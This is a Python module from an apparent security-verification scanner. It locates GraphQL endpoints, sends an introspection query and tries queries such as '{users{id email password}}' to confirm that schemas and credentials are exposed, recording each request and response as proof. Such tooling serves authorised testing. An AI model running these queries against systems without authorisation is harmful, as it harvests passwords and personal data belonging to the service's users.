"""graphql — active GraphQL exploitation: introspection + dangerous queries.

Ported from the ``_api_graphql`` stage of kaasec's ``api.sh``. Sends a single
introspection query (schema disclosure) and a couple of classic credential-hunting
queries, recording each request/response as proof.

Read-only: it only issues GraphQL *queries* (never mutations), so it observes the
schema/data without changing state — consistent with the ExploitModule contract.
"""
import json

import httpx

from backend.app.shasec.verifier import register
from backend.app.shasec.verifier._spec import origin
from backend.app.shasec.verifier.base import ExploitContext, ExploitModule, ExploitResult
from backend.common.enums import FindingSeverity
from backend.common.log import log

_CANDIDATES = ('/graphql', '/api/graphql', '/graphiql', '/v1/graphql', '/query')
_INTROSPECTION = '{__schema{types{name fields{name}}}}'
_DANGEROUS = (
    '{users{id email password}}',
    '{__type(name:"User"){fields{name}}}',
)
_HTTP_TIMEOUT = 10.0


class GraphQLModule(ExploitModule):
    name = 'graphql'
    category = 'graphql'
    handles = ('api', 'graphql', 'website')
    timeout = 90

    async def run(self, ctx: ExploitContext) -> list[ExploitResult]:
        base = origin(ctx.target_url)
        headers = {'Authorization': f'Bearer {ctx.auth_token}'} if ctx.auth_token else {}
        headers['Content-Type'] = 'application/json'
        results: list[ExploitResult] = []

        async with httpx.AsyncClient(timeout=_HTTP_TIMEOUT, follow_redirects=True, verify=False,
                                     headers=headers) as client:
            gql_url = await self._locate(client, base)
            if not gql_url:
                return []
            log.info(f'[exploit:graphql] scan {ctx.scan_id} endpoint {gql_url}')

            # --- Introspection ------------------------------------------------
            try:
                resp = await client.post(gql_url, json={'query': _INTROSPECTION})
            except httpx.HTTPError:
                return []
            body = resp.text[:2000] if resp.content else ''
            if '"__schema"' in body:
                n_types = self._count_types(resp)
                results.append(ExploitResult(
                    category='graphql-introspection',
                    title='Introspection GraphQL activée',
                    severity=FindingSeverity.high.value,
                    confirmed=True,
                    impact=f'Le schéma complet fuit ({n_types} types) : types, champs et mutations '
                           'exploitables sont exposés. À désactiver en production.',
                    request=f'POST {gql_url}\n{json.dumps({"query": _INTROSPECTION})}',
                    response=f'HTTP {resp.status_code}\n{body[:600]}',
                ))

            # --- Dangerous credential queries --------------------------------
            for query in _DANGEROUS:
                try:
                    r = await client.post(gql_url, json={'query': query})
                except httpx.HTTPError:
                    continue
                rbody = r.text[:2000] if r.content else ''
                low = rbody.lower()
                if '"errors"' in low and '"data"' not in low:
                    continue  # query rejected — not exploitable
                if '"password"' in low or ('"email"' in low and '"data"' in low):
                    results.append(ExploitResult(
                        category='graphql-data-exposure',
                        title='GraphQL expose des données sensibles (credentials/PII)',
                        severity=FindingSeverity.critical.value,
                        confirmed=True,
                        impact='Une requête GraphQL renvoie des champs password/email sans contrôle adéquat.',
                        request=f'POST {gql_url}\n{json.dumps({"query": query})}',
                        response=f'HTTP {r.status_code}\n{rbody[:600]}',
                    ))
        return results

    async def _locate(self, client: httpx.AsyncClient, base: str) -> str | None:
        for path in _CANDIDATES:
            url = f'{base}{path}'
            try:
                r = await client.post(url, json={'query': '{__typename}'})
            except httpx.HTTPError:
                continue
            body = (r.text[:1000] if r.content else '')
            if r.status_code in (200, 400) and ('__typename' in body or '"data"' in body or 'GraphQL' in body):
                return url
        return None

    @staticmethod
    def _count_types(resp: httpx.Response) -> int:
        try:
            data = resp.json()
            return len(data['data']['__schema']['types'])
        except (ValueError, KeyError, TypeError):
            return 0


register(GraphQLModule())
